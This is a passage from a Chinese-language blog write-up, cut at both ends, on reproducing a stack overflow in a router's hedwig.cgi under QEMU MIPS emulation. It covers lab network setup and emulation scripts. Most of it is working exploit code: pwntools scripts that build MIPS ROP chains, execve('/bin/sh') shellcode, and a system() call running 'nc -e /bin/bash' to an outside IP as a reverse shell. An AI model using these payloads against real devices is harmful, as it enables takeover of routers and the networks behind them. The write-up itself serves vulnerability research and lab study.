REQUEST_URI=&quot;2333&quot; \\</span><br><span class=\"line\">    ./htdocs/cgibin</span><br><span class=\"line\">&quot;&quot;&quot;, shell = True)</span><br><span class=\"line\">io.send(post_content)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ROP-shellcode\"><a href=\"#ROP-shellcode\" class=\"headerlink\" title=\"ROP + shellcode\"></a>ROP + shellcode</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = 0x7F738000</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x3cd</span><br><span class=\"line\">payload += b&#x27;a&#x27;*4</span><br><span class=\"line\">payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*4</span><br><span class=\"line\">payload += p32(libc_base + 0x56BD0) # s3  sleep</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*5)</span><br><span class=\"line\">payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=&gt; jalr $s1)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload += b&#x27;a&#x27;*0x18</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*4)</span><br><span class=\"line\">payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br><span class=\"line\">payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br><span class=\"line\"> </span><br><span class=\"line\">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class=\"line\">    slti $a2, $zero, -1</span><br><span class=\"line\">    li $t7, 0x69622f2f</span><br><span class=\"line\">    sw $t7, -12($sp)</span><br><span class=\"line\">    li $t6, 0x68732f6e</span><br><span class=\"line\">    sw $t6, -8($sp)</span><br><span class=\"line\">    sw $zero, -4($sp)</span><br><span class=\"line\">    la $a0, -12($sp)</span><br><span class=\"line\">    slti $a1, $zero, -1</span><br><span class=\"line\">    li $v0, 4011</span><br><span class=\"line\">    syscall 0x40404</span><br><span class=\"line\">&#x27;&#x27;&#x27;)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*0x18</span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&quot;uid=&quot; + payload</span><br><span class=\"line\">post_content = &quot;peruy=pwner&quot;</span><br><span class=\"line\">io = process(b&quot;&quot;&quot;</span><br><span class=\"line\">    qemu-mipsel -L ./ \\</span><br><span class=\"line\">    -0 &quot;hedwig.cgi&quot; \\</span><br><span class=\"line\">    -E REQUEST_METHOD=&quot;POST&quot; \\</span><br><span class=\"line\">    -E CONTENT_LENGTH=11 \\</span><br><span class=\"line\">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \\</span><br><span class=\"line\">    -E HTTP_COOKIE=\\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\\&quot; \\</span><br><span class=\"line\">    -E REQUEST_URI=&quot;2333&quot; \\</span><br><span class=\"line\">    ./htdocs/cgibin</span><br><span class=\"line\">&quot;&quot;&quot;, shell = True)</span><br><span class=\"line\">io.send(post_content)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"虚拟机网络配置\"><a href=\"#虚拟机网络配置\" class=\"headerlink\" title=\"虚拟机网络配置\"></a>虚拟机网络配置</h2><h3 id=\"✅-步骤一：禁用-NetworkManager-对-eth0-和-br0-的管理\"><a href=\"#✅-步骤一：禁用-NetworkManager-对-eth0-和-br0-的管理\" class=\"headerlink\" title=\"✅ 步骤一：禁用 NetworkManager 对 eth0 和 br0 的管理\"></a>✅ 步骤一：禁用 NetworkManager 对 <code>eth0</code> 和 <code>br0</code> 的管理</h3><p>编辑或创建一个配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> nano /etc/NetworkManager/conf.d/99-unmanaged-devices.conf</span><br></pre></td></tr></table></figure>\n\n<p>添加以下内容：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[keyfile]</span></span><br><span class=\"line\"><span class=\"attr\">unmanaged-devices</span>=interface-name:eth0<span class=\"comment\">;interface-name:br0</span></span><br></pre></td></tr></table></figure>\n\n<p>保存后重启 NetworkManager：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"✅-步骤二：创建-Netplan-配置文件\"><a href=\"#✅-步骤二：创建-Netplan-配置文件\" class=\"headerlink\" title=\"✅ 步骤二：创建 Netplan 配置文件\"></a>✅ 步骤二：创建 Netplan 配置文件</h3><p>备份原来的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> <span class=\"built_in\">mv</span> /etc/netplan/01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml.bak</span><br></pre></td></tr></table></figure>\n\n<p>创建新配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> nano /etc/netplan/01-bridge.yaml</span><br></pre></td></tr></table></figure>\n\n<p>内容如下（根据你实际接口名修改，比如 <code>ens33</code> 换成 <code>eth0</code>）：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">  <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"attr\">renderer:</span> <span class=\"string\">networkd</span></span><br><span class=\"line\">  <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">    <span class=\"attr\">eth0:</span></span><br><span class=\"line\">      <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">  <span class=\"attr\">bridges:</span></span><br><span class=\"line\">    <span class=\"attr\">br0:</span></span><br><span class=\"line\">      <span class=\"attr\">interfaces:</span> [<span class=\"string\">eth0</span>]</span><br><span class=\"line\">      <span class=\"attr\">dhcp4:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\">      <span class=\"attr\">parameters:</span></span><br><span class=\"line\">        <span class=\"attr\">stp:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"attr\">forward-delay:</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>⚠️ 注意：<br>如果你虚拟机里的接口名是 <code>ens33</code> 而不是 <code>eth0</code>，请把上面两处 <code>eth0</code> 改成 <code>ens33</code>。</p>\n</blockquote>\n<hr>\n<h3 id=\"✅-步骤三：应用配置\"><a href=\"#✅-步骤三：应用配置\" class=\"headerlink\" title=\"✅ 步骤三：应用配置\"></a>✅ 步骤三：应用配置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> netplan apply</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"✅-验证\"><a href=\"#✅-验证\" class=\"headerlink\" title=\"✅ 验证\"></a>✅ 验证</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip addr show br0</span><br><span class=\"line\">ip route</span><br></pre></td></tr></table></figure>\n\n<p>你应该能看到 <code>br0</code> 拿到了 DHCP 地址，<code>eth0</code> 没有 IP。</p>\n<h2 id=\"下载镜像\"><a href=\"#下载镜像\" class=\"headerlink\" title=\"下载镜像\"></a>下载镜像</h2><p><a href=\"https://people.debian.org/~aurel32/qemu/mipsel/\">https://people.debian.org/~aurel32/qemu/mipsel/</a><br>下载其中的<code>vmlinux-3.2.0-4-4kc-malta</code>内核以及<code>debian_squeeze_mipsel_standard.qcow2</code>镜像文件</p>\n<h2 id=\"qemu系统下\"><a href=\"#qemu系统下\" class=\"headerlink\" title=\"qemu系统下\"></a>qemu系统下</h2><h3 id=\"启动脚本\"><a href=\"#启动脚本\" class=\"headerlink\" title=\"启动脚本\"></a>启动脚本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">sudo qemu-system-mipsel \\</span><br><span class=\"line\">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \\</span><br><span class=\"line\">    -hda debian_squeeze_mipsel_standard.qcow2 \\</span><br><span class=\"line\">    -append &quot;root=/dev/sda1 console=tty0&quot; \\</span><br><span class=\"line\">    -net nic,macaddr=00:16:3e:00:00:01 \\</span><br><span class=\"line\">    -net tap</span><br></pre></td></tr></table></figure>\n<h3 id=\"http-cond\"><a href=\"#http-cond\" class=\"headerlink\" title=\"http_cond\"></a>http_cond</h3><p>在qemu 中 &#x2F;root&#x2F;squashfs-root&#x2F; 下创建</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Umask 026</span><br><span class=\"line\">PIDFile /var/run/httpd.pid</span><br><span class=\"line\">LogGMT On  #开启log</span><br><span class=\"line\">ErrorLog /log #log文件</span><br><span class=\"line\"> </span><br><span class=\"line\">Tuning</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    NumConnections 15</span><br><span class=\"line\">    BufSize 12288</span><br><span class=\"line\">    InputBufSize 4096</span><br><span class=\"line\">    ScriptBufSize 4096</span><br><span class=\"line\">    NumHeaders 100</span><br><span class=\"line\">    Timeout 60</span><br><span class=\"line\">    ScriptTimeout 60</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">Control</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Types</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        text/html    &#123; html htm &#125;</span><br><span class=\"line\">        text/xml    &#123; xml &#125;</span><br><span class=\"line\">        text/plain    &#123; txt &#125;</span><br><span class=\"line\">        image/gif    &#123; gif &#125;</span><br><span class=\"line\">        image/jpeg    &#123; jpg &#125;</span><br><span class=\"line\">        text/css    &#123; css &#125;</span><br><span class=\"line\">        application/octet-stream &#123; * &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Specials</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Dump        &#123; /dump &#125;</span><br><span class=\"line\">        CGI            &#123; cgi &#125;</span><br><span class=\"line\">        Imagemap    &#123; map &#125;</span><br><span class=\"line\">        Redirect    &#123; url &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    External</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">Server</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class=\"line\">    ServerId &quot;1234&quot;</span><br><span class=\"line\">    Family inet</span><br><span class=\"line\">    Interface eth1 #对应qemu仿真路由器系统的网卡</span><br><span class=\"line\">    Address 192.168.225.129 #qemu仿真路由器系统的IP</span><br><span class=\"line\">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class=\"line\">    Virtual</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AnyHost</span><br><span class=\"line\">        Control</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Alias /</span><br><span class=\"line\">            Location /htdocs/web</span><br><span class=\"line\">            IndexNames &#123; index.php &#125;</span><br><span class=\"line\">            External</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class=\"line\">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Control</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Alias /HNAP1</span><br><span class=\"line\">            Location /htdocs/HNAP1</span><br><span class=\"line\">            External</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            IndexNames &#123; index.hnap &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"net-sh\"><a href=\"#net-sh\" class=\"headerlink\" title=\"net.sh\"></a>net.sh</h3><p>物理机上运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /bin/sh</span><br><span class=\"line\">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class=\"line\">sudo iptables -F</span><br><span class=\"line\">sudo iptables -X</span><br><span class=\"line\">sudo iptables -t nat -F</span><br><span class=\"line\">sudo iptables -t nat -X</span><br><span class=\"line\">sudo iptables -t mangle -F</span><br><span class=\"line\">sudo iptables -t mangle -X</span><br><span class=\"line\">sudo iptables -P INPUT ACCEPT</span><br><span class=\"line\">sudo iptables -P FORWARD ACCEPT</span><br><span class=\"line\">sudo iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class=\"line\">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"init-sh\"><a href=\"#init-sh\" class=\"headerlink\" title=\"init.sh\"></a>init.sh</h3><p>在qemu中squashfs-root下创建</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class=\"line\">cp http_conf /</span><br><span class=\"line\">cp sbin/httpd /</span><br><span class=\"line\">cp -rf htdocs/ /</span><br><span class=\"line\">mkdir /etc_bak</span><br><span class=\"line\">cp -r /etc /etc_bak</span><br><span class=\"line\">rm /etc/services</span><br><span class=\"line\">cp -rf etc/ /</span><br><span class=\"line\">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class=\"line\">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class=\"line\">cp lib/libc.so.0  /lib/</span><br><span class=\"line\">cp lib/libgcc_s.so.1  /lib/</span><br><span class=\"line\">cp lib/ld-uClibc.so.0  /lib/</span><br><span class=\"line\">cp lib/libcrypt.so.0  /lib/</span><br><span class=\"line\">cp lib/libgcc_s.so  /lib/</span><br><span class=\"line\">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class=\"line\">cd /</span><br><span class=\"line\">rm -rf /htdocs/web/hedwig.cgi</span><br><span class=\"line\">rm -rf /usr/sbin/phpcgi</span><br><span class=\"line\">rm -rf /usr/sbin/hnap</span><br><span class=\"line\">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class=\"line\">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class=\"line\">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class=\"line\">./httpd -f http_conf</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"fin-sh\"><a href=\"#fin-sh\" class=\"headerlink\" title=\"fin.sh\"></a>fin.sh</h3><p>qemu中squashfs-root下创建，退出时运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">rm -rf /etc</span><br><span class=\"line\">mv /etc_bak/etc /etc</span><br><span class=\"line\">rm -rf /etc_bak</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"开启服务\"><a href=\"#开启服务\" class=\"headerlink\" title=\"开启服务\"></a>开启服务</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810194723866.png\" alt=\"访问网站\"></p>\n<h3 id=\"run-sh\"><a href=\"#run-sh\" class=\"headerlink\" title=\"run.sh\"></a>run.sh</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class=\"line\">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class=\"line\">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class=\"line\">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class=\"line\">export REQUEST_URI=&quot;2333&quot;</span><br><span class=\"line\">echo &quot;peruy=pwner&quot;|./gdbserver.mipsle 192.168.225.154:6666 /htdocs/web/hedwig.cgi</span><br><span class=\"line\">#echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span><br><span class=\"line\">unset CONTENT_LENGTH</span><br><span class=\"line\">unset CONTENT_TYPE</span><br><span class=\"line\">unset HTTP_COOKIE</span><br><span class=\"line\">unset REQUEST_METHOD</span><br><span class=\"line\">unset REQUEST_URI</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查找libc-和-偏移\"><a href=\"#查找libc-和-偏移\" class=\"headerlink\" title=\"查找libc 和 偏移\"></a>查找libc 和 偏移</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810220153748.png\" alt=\"qemu调试\"></p>\n<h3 id=\"发送payload\"><a href=\"#发送payload\" class=\"headerlink\" title=\"发送payload\"></a>发送payload</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810221044091.png\" alt=\"打通\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><h3 id=\"直接发payload\"><a href=\"#直接发payload\" class=\"headerlink\" title=\"直接发payload\"></a>直接发payload</h3><h4 id=\"ROP链\"><a href=\"#ROP链\" class=\"headerlink\" title=\"ROP链\"></a>ROP链</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">cmd = <span class=\"string\">b&#x27;nc -e /bin/bash 192.168.192.128 8888&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x53200</span> - <span class=\"number\">1</span>) <span class=\"comment\"># s0  system_addr - 1</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x169C4</span>) <span class=\"comment\"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x32A98</span>) <span class=\"comment\"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += cmd</span><br><span class=\"line\"> </span><br><span class=\"line\">fd = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;payload&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>)</span><br><span class=\"line\">fd.write(payload)</span><br><span class=\"line\">fd.close()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ROP-shellcode-1\"><a href=\"#ROP-shellcode-1\" class=\"headerlink\" title=\"ROP+shellcode\"></a>ROP+shellcode</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span 